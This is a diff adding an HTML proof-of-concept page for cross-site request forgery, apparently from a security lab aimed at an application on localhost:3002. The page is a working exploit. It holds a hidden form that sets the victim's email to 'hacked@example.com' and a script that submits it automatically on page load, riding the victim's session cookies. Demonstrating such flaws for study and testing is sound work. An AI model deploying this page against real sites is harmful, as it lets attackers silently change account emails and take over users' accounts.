@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Proof of Concept for CSRF</title>
+</head>
+<body>
+    <h1>CSRF Proof-of-Concept Page</h1>
+    <p>This page demonstrates a CSRF vulnerability. If a user who is logged into the target application (on localhost:3002) visits this page, it will automatically try to change their email address without their consent.</p>
+
+    <!--
+        This form is hidden from the user. It targets the vulnerable endpoint on the other application.
+        The action URL must point to the target server.
+    -->
+    <form id="csrf-form" action="http://localhost:3002/update-email" method="post" style="display:none;">
+        <input type="hidden" name="email" value="hacked@example.com">
+    </form>
+
+    <script>
+        // This script automatically submits the form as soon as the page loads.
+        // The browser will automatically include the user's cookies for the target domain (localhost:3002),
+        // which is what makes the CSRF possible.
+        window.onload = function() {
+            console.log("Submitting the CSRF form...");
+            document.getElementById('csrf-form').submit();
+            console.log("Form submitted.");
+        };
+    </script>
+    <p>The form has been submitted in the background. Check the settings page on the target application to see if the email has changed.</p>
+</body>
+</html>
